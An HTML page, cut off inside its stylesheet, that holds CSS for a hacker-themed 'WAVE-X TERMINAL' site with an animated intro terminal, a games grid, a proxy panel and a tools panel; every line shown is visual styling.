<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[WAVE-X TERMINAL] :: ACCESS GRANTED</title>
    <style>
        :root {
            /* Cyber Green Hacker Theme */
            --terminal-black: #000000;
            --terminal-green: #00ff00;
            --terminal-cyan: #00ffff;
            --terminal-orange: #ffa500;
            --terminal-yellow: #ffff00;
            --terminal-red: #ff0000;
            --terminal-purple: #9932cc;
            --hacker-green: #00ff00;
            --hacker-cyan: #00ffff;
            --hacker-orange: #ffa500;
            --hacker-red: #ff0000;
            --hacker-black: #000000;
            --hacker-purple: #9932cc;
            --hacker-yellow: #ffff00;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            background: #000000;
            background-attachment: fixed;
            color: var(--terminal-green);
            font-family: 'Courier New', 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            margin: 0;
            padding: 0;
            line-height: 1.4;
            text-shadow: 0 0 5px currentColor;
        }

        /* Modern Cursor */
        .cursor::after {
            content: '|';
            animation: modernBlink 1.2s infinite;
            color: var(--accent-color);
            font-weight: bold;
        }

        /* Matrix Rain Animation (Modern Background Effect) */
        .matrix-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
            overflow: hidden;
            opacity: 0.08;
        }

        .matrix-char {
            position: absolute;
            color: var(--accent-color);
            font-size: 12px;
            opacity: 0.3;
            user-select: none;
            font-family: 'Consolas', 'Monaco', monospace;
            text-shadow: 0 0 8px var(--accent-color);
        }

        /* Background Particles */
        .background-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            background: var(--accent-color);
            border-radius: 50%;
            animation: float 20s linear infinite;
            opacity: 0.6;
        }

        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); }
            100% { transform: translateY(-100vh) rotate(360deg); }
        }

        /* Hacker Terminal Interface */
        .terminal {
            position: fixed;
            top: 20px;
            left: 20px;
            right: 20px;
            bottom: 60px;
            z-index: 10;
            border-radius: 8px;
            border: 2px solid #333;
            background: var(--terminal-black);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        .terminal-header {
            display: flex;
            align-items: center;
            padding: 8px 15px;
            background: linear-gradient(90deg, #1a1a1a, #333, #1a1a1a);
            border-bottom: 1px solid #666;
        }

        .terminal-buttons {
            display: flex;
            gap: 8px;
            margin-right: 15px;
        }

        .terminal-btn {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            border: none;
            cursor: pointer;
        }

        .terminal-btn-red {
            background: #ff6b6b;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3);
        }

        .terminal-btn-yellow {
            background: #feca57;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3);
        }

        .terminal-btn-green {
            background: #48dbfb;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3);
        }

        .terminal-title {
            color: #999;
            font-size: 12px;
            font-family: monospace;
            font-weight: bold;
            margin: 0;
            flex-grow: 1;
        }

        .terminal-content {
            flex: 1;
            padding: 15px;
            background: var(--terminal-black);
            color: var(--terminal-green);
            font-family: 'Courier New', 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            font-size: 14px;
            line-height: 1.4;
            overflow-y: auto;
            position: relative;
        }

        .terminal-line {
            margin-bottom: 5px;
            white-space: pre-wrap;
            display: flex;
            align-items: flex-start;
        }

        .terminal-prompt {
            color: var(--hacker-cyan);
            font-weight: bold;
            margin-right: 8px;
        }

        .typing-text {
            color: var(--terminal-green);
        }

        .terminal-output {
            color: var(--hacker-green);
            font-weight: normal;
        }

        .terminal-output.success { color: var(--hacker-green); }
        .terminal-output.warning { color: var(--hacker-orange); }
        .terminal-output.error { color: var(--hacker-red); }

        #terminalCrsr {
            animation: terminalCursor 1.2s infinite;
            display: inline;
        }

        @keyframes terminalCursor {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        /* Modern Welcome Panel */
        .welcome-panel {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0);
            z-index: 50;
            opacity: 0;
            transition: all 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            overflow: hidden;
        }

        .welcome-panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, rgba(3, 7, 18, 0.95), rgba(15, 23, 42, 0.9));
            backdrop-filter: blur(40px);
            z-index: -1;
        }

        .welcome-panel::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            animation: scanWelcome 3s linear infinite;
            z-index: -1;
        }

        @keyframes scanWelcome {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }

        .welcome-content {
            padding: 60px 40px 40px;
            text-align: center;
            background: rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }

        .welcome-header h1 {
            font-size: 2.5rem;
            font-weight: bold;
            background: linear-gradient(45deg, var(--accent-color), var(--accent-hover));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
            letter-spacing: 3px;
            text-shadow: 0 0 30px var(--accent-color);
        }

        .welcome-subtitle {
            color: var(--secondary-text);
            font-size: 0.9rem;
            font-weight: 300;
            letter-spacing: 2px;
            margin-bottom: 30px;
        }

        .welcome-msg {
            font-size: 1.2rem;
            color: var(--primary-text);
            font-weight: 500;
            margin-bottom: 30px;
            min-height: 30px;
        }

        .welcome-status {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            margin-bottom: 20px;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 12px;
            color: var(--primary-text);
            font-weight: 500;
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: var(--error-color);
            animation: pulse 2s infinite;
            transition: background 0.3s ease;
        }

        .status-dot.active {
            background: var(--success-color);
            animation: none;
            box-shadow: 0 0 15px var(--success-color);
        }

        .status-text {
            font-size: 1rem;
            font-weight: 500;
        }

        .welcome-loading {
            width: 100%;
            max-width: 300px;
        }

        .loading-bar {
            width: 100%;
            height: 4px;
            background: rgba(59, 130, 246, 0.2);
            border-radius: 2px;
            overflow: hidden;
            position: relative;
        }

        .loading-bar::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
            animation: progressBar 2s linear infinite;
        }

        .loading-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--accent-color), var(--accent-hover));
            width: 0%;
            border-radius: 2px;
            transition: width 0.3s ease;
        }

        @keyframes progressBar {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        /* Loading Bar */
        .progress-bar {
            position: absolute;
            bottom: 20px;
            left: 20px;
            right: 20px;
            height: 4px;
            background: rgba(0, 255, 255, 0.1);
            border-radius: 2px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--hacker-cyan), var(--hacker-green));
            width: 0%;
            animation: progress 5s ease-out forwards;
        }

        /* Dramatic Effects */
        .glitch-effect {
            animation: glitch 0.3s linear infinite;
        }

        .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--hacker-cyan), transparent);
            animation: scanMove 2s linear infinite;
            pointer-events: none;
        }

        .corruption {
            background: rgba(255, 0, 0, 0.1);
            animation: corruptionFlash 0.1s linear infinite alternate;
        }

        /* Status Messages */
        .status-message {
            position: absolute;
            top: 20px;
            right: 20px;
            color: var(--hacker-orange);
            font-size: 12px;
            opacity: 0;
            animation: statusFade 2s ease-in-out forwards;
        }

        /* Key Animations */
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        @keyframes textGlow {
            0% { text-shadow: 0 0 5px var(--hacker-cyan); }
            100% { text-shadow: 0 0 15px var(--hacker-cyan), 0 0 25px var(--hacker-cyan); }
        }

        @keyframes progress {
            0% { width: 0%; }
            80% { width: 95%; }
            100% { width: 100%; }
        }

        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            10% { transform: translate(-2px, 2px); }
            20% { transform: translate(-2px, -2px); }
            30% { transform: translate(2px, 2px); }
            40% { transform: translate(2px, -2px); }
        }

        @keyframes scanMove {
            0% { top: 0; }
            100% { top: 100%; }
        }

        @keyframes corruptionFlash {
            0% { background-color: rgba(255, 0, 0, 0.1); }
            100% { background-color: rgba(255, 0, 0, 0.3); }
        }

        @keyframes statusFade {
            0% { opacity: 0; transform: translateY(-10px); }
            50% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(10px); }
        }

        @keyframes passwordTry {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); color: var(--hacker-orange); }
            100% { transform: scale(1); }
        }

        @keyframes terminalIntro {
            0% {
                opacity: 0;
                transform: translate(-50%, -50%) scale(0.8) rotateX(90deg);
                filter: blur(10px);
            }
            50% {
                opacity: 0.7;
                transform: translate(-50%, -50%) scale(1.05) rotateX(10deg);
                filter: blur(2px);
            }
            100% {
                opacity: 1;
                transform: translate(-50%, -50%) scale(1) rotateX(0deg);
                filter: blur(0px);
            }
        }

        /* Chromebook Crasher shudder effect - matching reference */
        @keyframes shudder {
            0% { transform: translate(0); }
            50% { transform: translate(3px, -3px); }
            100% { transform: translate(0); }
        }

        /* Audio Visualizer Bars (simulated) */
        .audio-bars {
            position: fixed;
            bottom: 20px;
            left: 20px;
            display: flex;
            gap: 2px;
            z-index: 5;
        }

        .audio-bar {
            width: 3px;
            background: var(--hacker-green);
            height: 20px;
            animation: audioWave 0.5s ease-in-out infinite alternate;
        }

        .audio-bar:nth-child(2) { animation-delay: 0.1s; height: 25px; }
        .audio-bar:nth-child(3) { animation-delay: 0.2s; height: 15px; }
        .audio-bar:nth-child(4) { animation-delay: 0.3s; height: 30px; }
        .audio-bar:nth-child(5) { animation-delay: 0.4s; height: 18px; }

        @keyframes audioWave {
            0% { opacity: 0.3; transform: scaleY(0.5); }
            100% { opacity: 1; transform: scaleY(1); }
        }

        /* Security Level Indicator */
        .security-level {
            position: fixed;
            top: 20px;
            left: 20px;
            font-size: 12px;
            color: var(--hacker-orange);
            text-shadow: 0 0 5px var(--hacker-orange);
        }

        /* Override animations for intro */
        .terminal {
            animation: terminalIntro 1.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }

        /* Hidden elements */
        .hidden { display: none; }

        /* Completion state */
        .completed .terminal {
            border-color: var(--hacker-green);
            box-shadow: 0 0 100px rgba(0, 255, 65, 0.5);
        }

        .completed .terminal-header {
            background: linear-gradient(90deg, var(--hacker-black), var(--hacker-green), var(--hacker-black));
        }

        /* Games Page Styles */
        .games-page {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: var(--hacker-black);
            opacity: 0;
            visibility: hidden;
            transition: opacity 1s ease-in-out, visibility 0s 1s;
            overflow-y: auto;
            z-index: 5;
        }

        .games-page.show {
            opacity: 1;
            visibility: visible;
        }

        /* Tab System (Enhanced Hacker Theme) */
        .tab-bar {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 60px;
            background: linear-gradient(135deg, #0a0a0a, #1a1a1a, #0a0a0a);
            border-bottom: 3px solid #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3), inset 0 0 20px rgba(0, 255, 0, 0.1);
            display: flex;
            align-items: center;
            z-index: 6;
            overflow: hidden;
        }

        .tab-bar::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
            animation: scanLine 3s linear infinite;
        }

        .tab {
            background: linear-gradient(135deg, #1a1a1a, #0a0a0a);
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 12px 25px;
            margin: 8px;
            cursor: pointer;
            border-radius: 0;
            transition: all 0.3s ease;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-size: 12px;
            position: relative;
            overflow: hidden;
            text-shadow: 0 0 10px #00ff00;
        }

        .tab::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.2), transparent);
            transition: left 0.5s;
        }

        .tab:hover::before,
        .tab.active::before {
            left: 100%;
        }

        .tab.active {
            background: linear-gradient(135deg, #00ff00, #00aa00, #00ff00);
            color: #000000;
            border-color: #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8), inset 0 0 10px rgba(0, 255, 0, 0.5);
            text-shadow: none;
            transform: translateY(0);
        }

        .tab:hover:not(.active) {
            background: linear-gradient(135deg, #2a2a2a, #1a1a1a);
            border-color: #00aa00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.4);
            transform: scale(1.05);
        }

        @keyframes scanLine {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .tab-content {
            display: none;
            padding-top: 70px; /* Account for tab bar */
            min-height: calc(100vh - 70px);
        }

        .tab-content.active {
            display: block;
        }

        .games-header {
            padding: 40px 20px 20px;
            text-align: center;
            background: linear-gradient(180deg, rgba(0, 0, 0, 0.9) 0%, rgba(0, 255, 65, 0.1) 100%);
            border-bottom: 2px solid var(--hacker-cyan);
        }

        .games-header h1 {
            color: var(--hacker-cyan);
            font-size: 3rem;
            font-weight: bold;
            text-shadow: 0 0 20px var(--hacker-cyan);
            margin-bottom: 10px;
            letter-spacing: 2px;
        }

        .games-header .subtitle {
            color: var(--hacker-green);
            font-size: 1.2rem;
            opacity: 0.8;
            margin-bottom: 20px;
        }

        .games-controls {
            display: flex;
            justify-content: center;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }

        .dark-mode-toggle {
            position: absolute;
            top: 10px;
            right: 20px;
            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 8px 15px;
            border-radius: 0;
            cursor: pointer;
            font-size: 12px;
            font-family: monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
        }

        .dark-mode-toggle:hover {
            background: linear-gradient(135deg, #00ff00, #00aa00);
            color: #000000;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.8);
        }

        .search-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }

        .search-input {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid var(--hacker-cyan);
            color: var(--hacker-green);
            padding: 12px 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            width: 300px;
            max-width: 80%;
        }

        .search-input:focus {
            outline: none;
            border-color: var(--hacker-green);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
        }

        .search-input::placeholder {
            color: var(--hacker-orange);
            opacity: 0.7;
        }

        .search-btn {
            background: linear-gradient(135deg, var(--hacker-black), var(--hacker-cyan));
            border: 2px solid var(--hacker-cyan);
            color: var(--hacker-cyan);
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            margin-left: 10px;
        }

        .search-btn:hover {
            background: linear-gradient(135deg, var(--hacker-cyan), var(--hacker-black));
            color: var(--hacker-black);
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
        }

        .games-btn {
            background: linear-gradient(135deg, var(--hacker-black), var(--hacker-cyan));
            border: 2px solid var(--hacker-cyan);
            color: var(--hacker-cyan);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
        }

        .games-btn:hover {
            background: linear-gradient(135deg, var(--hacker-cyan), var(--hacker-black));
            color: var(--hacker-black);
            transform: scale(1.05);
            box-shadow: 0 0 25px rgba(0, 255, 255, 0.6);
        }

        .games-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 15px;
            padding: 30px;
            max-width: 1400px;
            margin: 0 auto;
        }

        .game-card {
            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
            border: 2px solid #00ff00;
            border-radius: 0;
            overflow: hidden;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.4), inset 0 0 10px rgba(0, 255, 0, 0.1);
            backdrop-filter: blur(10px);
            position: relative;
            font-family: monospace;
        }

        .game-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff00, transparent);
            transition: left 0.5s;
        }

        .game-card:hover::before {
            left: 100%;
        }

        .game-card:hover {
            transform: translateY(-10px) scale(1.02);
            border-color: var(--hacker-green);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
            z-index: 10;
        }

        .game-thumb {
            width: 100%;
            height: 120px;
            background-size: cover !important;
            background-position: center !important;
            background-repeat: no-repeat !important;
            border-radius: 0;
            transition: transform 0.3s ease;
        }

        .game-card:hover .game-thumb {
            transform: scale(1.05);
        }

        .game-caption {
            padding: 15px;
            text-align: center;
            color: var(--hacker-green);
            font-size: 16px;
            font-weight: bold;
            text-shadow: 0 0 10px var(--hacker-green);
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9), rgba(0, 255, 65, 0.1));
        }

        .game-card:before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.5s;
            z-index: 1;
        }

        .game-card:hover:before {
            left: 100%;
        }

        /* Matrix rain persists on games page */
        .games-page.show ~ .matrix-rain {
            z-index: 1;
        }

        /* Loading animation for game transitions */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .game-card {
            animation: fadeInUp 0.6s ease-out forwards;
        }

        .game-card:nth-child(odd) {
            animation-delay: 0.1s;
        }

        .game-card:nth-child(even) {
            animation-delay: 0.2s;
        }

        /* Advanced 3D Hover Animation System */
        .game-card-container {
            position: relative;
            perspective: 1000px;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        .game-card-tracker {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 2;
            pointer-events: none;
            display: grid;
            grid-template-columns: repeat(10, 1fr);
            grid-template-rows: repeat(10, 1fr);
        }

        .game-card-tracker div {
            width: 100%;
            height: 100%;
            background: transparent;
        }

        .game-card-advanced {
            position: relative;
            width: 100%;
            height: 100%;
            transform-style: preserve-3d;
            transition: transform 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow:
                0 0 25px rgba(0, 255, 0, 0.2),
                inset 0 0 15px rgba(0, 255, 0, 0.1),
                0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .game-card-container:hover .game-card-advanced {
            transform: rotateY(0deg) rotateX(0deg) scale(1.05);
        }

        .game-card-advanced:hover {
            animation: none;
        }

        /* Zone-based transforms */
        .game-card-container[data-zone="top-left"]:hover .game-card-advanced {
            transform: rotateY(-15deg) rotateX(15deg) scale(1.08);
        }
        .game-card-container[data-zone="top-center"]:hover .game-card-advanced {
            transform: rotateX(12deg) scale(1.06);
        }
        .game-card-container[data-zone="top-right"]:hover .game-card-advanced {
            transform: rotateY(15deg) rotateX(15deg) scale(1.08);
        }
        .game-card-container[data-zone="middle-left"]:hover .game-card-advanced {
            transform: rotateY(-10deg) scale(1.04);
        }
        .game-card-container[data-zone="middle-center"]:hover .game-card-advanced {
            transform: scale(1.03);
        }
        .game-card-container[data-zone="middle-right"]:hover .game-card-advanced {
            transform: rotateY(10deg) scale(1.04);
        }
        .game-card-container[data-zone="bottom-left"]:hover .game-card-advanced {
            transform: rotateY(-15deg) rotateX(-15deg) scale(1.08);
        }
        .game-card-container[data-zone="bottom-center"]:hover .game-card-advanced {
            transform: rotateX(-12deg) scale(1.06);
        }
        .game-card-container[data-zone="bottom-right"]:hover .game-card-advanced {
            transform: rotateY(15deg) rotateX(-15deg) scale(1.08);
        }

        /* Enhanced glows for advanced animations */
        .game-card-container:hover .game-card-advanced {
            box-shadow:
                0 0 50px rgba(0, 255, 0, 0.4),
                0 0 100px rgba(0, 255, 0, 0.2),
                inset 0 0 20px rgba(0, 255, 0, 0.2),
                0 15px 40px rgba(0, 0, 0, 0.4);
        }

        /* Advanced background glitch effect */
        .game-card-advanced::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(
                45deg,
                transparent,
                rgba(0, 255, 0, 0.1),
                transparent,
                rgba(0, 255, 255, 0.1),
                transparent
            );
            opacity: 0;
            transition: opacity 0.3s ease;
            z-index: 1;
        }

        .game-card-container:hover .game-card-advanced::before {
            opacity: 1;
            animation: scanLine 2s linear infinite;
        }

        /* Proxy Interface Styles */
        .proxy-interface {
            padding: 40px 20px;
            text-align: center;
            max-width: 1000px;
            margin: 0 auto;
        }

        .proxy-interface h1 {
            color: var(--hacker-cyan);
            font-size: 2.5rem;
            font-weight: bold;
            text-shadow: 0 0 20px var(--hacker-cyan);
            margin-bottom: 30px;
        }

        .proxy-status {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid var(--hacker-cyan);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
            flex-wrap: wrap;
            gap: 20px;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--hacker-green);
            font-weight: bold;
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: var(--hacker-red);
        }

        .status-dot.active {
            background: var(--hacker-green);
            box-shadow: 0 0 10px var(--hacker-green);
        }

        .status-metrics {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }

        .metric {
            color: var(--hacker-cyan);
            font-size: 14px;
        }

        .proxy-controls {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }

        .proxy-btn {
            background: linear-gradient(135deg, var(--hacker-black), var(--hacker-cyan));
            border: 2px solid var(--hacker-cyan);
            color: var(--hacker-cyan);
            padding: 12px 24px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
        }

        .proxy-btn:hover:not(.active) {
            background: linear-gradient(135deg, var(--hacker-cyan), var(--hacker-black));
            transform: scale(1.05);
            box-shadow: 0 0 25px rgba(0, 255, 255, 0.6);
        }

        .proxy-btn.active {
            background: linear-gradient(135deg, var(--hacker-green), var(--hacker-black));
            border-color: var(--hacker-green);
            color: var(--hacker-black);
            box-shadow: 0 0 25px rgba(0, 255, 65, 0.6);
        }

        .proxy-log {
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid var(--hacker-cyan);
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 30px;
            max-height: 400px;
            overflow-y: auto;
        }

        .log-header {
            background: linear-gradient(90deg, var(--hacker-cyan), var(--hacker-black));
            color: var(--hacker-black);
            padding: 10px 15px;
            font-weight: bold;
            text-align: center;
            font-size: 14px;
        }

        .log-entries {
            padding: 15px;
            max-height: 350px;
            overflow-y: auto;
        }

        .log-entry {
            padding: 3px 0;
            font-size: 13px;
            font-family: monospace;
        }

        .log-entry.success { color: var(--hacker-green); }
        .log-entry.info { color: var(--hacker-cyan); }
        .log-entry.warning { color: var(--hacker-orange); }
        .log-entry.error { color: var(--hacker-red); }

        .url-input-container {
            display: flex;
            gap: 10px;
            margin-top: 10px;
            flex-wrap: wrap;
        }

        .url-input {
            flex: 1;
            min-width: 200px;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid var(--hacker-cyan);
            color: var(--hacker-green);
            padding: 12px 15px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
        }

        .url-input:focus {
            outline: none;
            border-color: var(--hacker-green);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
        }

        .url-submit, .proxy-url-input {
            font-family: monospace;
        }

        .url-submit {
            background: linear-gradient(135deg, var(--hacker-black), var(--hacker-cyan));
            border: 2px solid var(--hacker-cyan);
            color: var(--hacker-black);
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
        }

        .url-submit:hover {
            background: linear-gradient(135deg, var(--hacker-cyan), var(--hacker-black));
            color: var(--hacker-cyan);
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
        }

        .url-label {
            color: var(--hacker-orange);
            font-size: 16px;
            font-weight: bold;
        }

        .proxy-url-input {
            text-align: center;
        }

        /* Proxy Launch Section */
        .proxy-launch-section {
            text-align: center;
            margin-top: 50px;
        }

        .launch-proxy-btn {
            background: linear-gradient(135deg, var(--hacker-black), var(--hacker-green));
            border: 3px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 20px 40px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 24px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s ease;
            box-shadow: 0 0 25px rgba(0, 255, 0, 0.5);
            margin-bottom: 30px;
        }

        .launch-proxy-btn:hover {
            background: linear-gradient(135deg, var(--hacker-green), var(--hacker-black));
            transform: scale(1.05);
            box-shadow: 0 0 40px rgba(0, 255, 0, 0.8);
        }

        .launch-proxy-btn:active {
            transform: scale(0.95);
        }

        .proxy-overlay-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: var(--hacker-green);
            font-size: 28px;
            font-family: monospace;
            font-weight: bold;
            text-shadow: 0 0 20px var(--hacker-green);
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid var(--hacker-cyan);
            border-radius: 10px;
            padding: 30px 50px;
            z-index: 2000;
            white-space: nowrap;
        }

        /* Tools Interface Styles */
        .tools-interface {
            padding: 40px 20px;
            text-align: center;
            max-width: 1000px;
            margin: 0 auto;
        }

        /* Enhanced Tab Bar */
        .tab {
            background: linear-gradient(135deg, #1a1a1a, #0a0a0a);
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 15px 30px;
            margin: 8px;
            cursor: pointer;
            border-radius: 0;
            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 3px;
            font-size: 14px;
            position: relative;
            overflow: hidden;
            text-shadow: 0 0 10px #00ff00;
            min-width: 140px;
        }

        .tab::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg,
                transparent,
                rgba(0, 255, 0, 0.2),
                rgba(0, 255, 0, 0.4),
                rgba(0, 255, 0, 0.2),
                transparent);
            transition: left 0.6s;
            z-index: 0;
        }

        .tab > * {
            position: relative;
            z-index: 1;
        }

        .tab:hover::before,
        .tab.active::before {
            left: 100%;
        }

        .tab.active {
            background: linear-gradient(135deg, #00ff00, #00aa00, #00ff00);
            color: #000000;
            border-color: #00ff00;
            box-shadow:
                0 0 25px rgba(0, 255, 0, 0.6),
                inset 0 0 15px rgba(0, 255, 0, 0.3),
                0 0 0 1px rgba(255, 255, 255, 0.1);
            text-shadow: none;
            transform: scale(1.05) translateY(-2px);
        }

        .tab:hover:not(.active) {
            background: linear-gradient(135deg, #2a2a2a, #1a1a1a);
            border-color: #00aa00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
            transform: translateY(-1px);
        }

        .tab:active {
            transform: scale(0.98) translateY(0);
            transition: transform 0.1s;
        }

        .tools-interface h1 {
            color: var(--hacker-cyan);
            font-size: 2.5rem;
            font-weight: bold;
            text-shadow: 0 0 20px var(--hacker-cyan);
            margin-bottom: 30px;
            text-align: center;
            background: linear-gradient(45deg, var(--hacker-cyan), var(--hacker-green), var(--hacker-cyan));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 15px;
            margin-top: 30px;
        }

        .tool-card {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.95), rgba(15, 23, 42, 0.9));
            border: 2px solid var(--hacker-cyan);
            border-radius: 20px;
            padding: 35px 30px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow:
                0 0 25px rgba(0, 255, 255, 0.2),
                inset 0 0 0 1px rgba(0, 255, 255, 0.1),
                0 10px 30px rgba(0, 0, 0, 0.3);
            text-align: center;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(15px);
            transform: translateY(0);
            min-height: 180px;
        }

        .tool-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
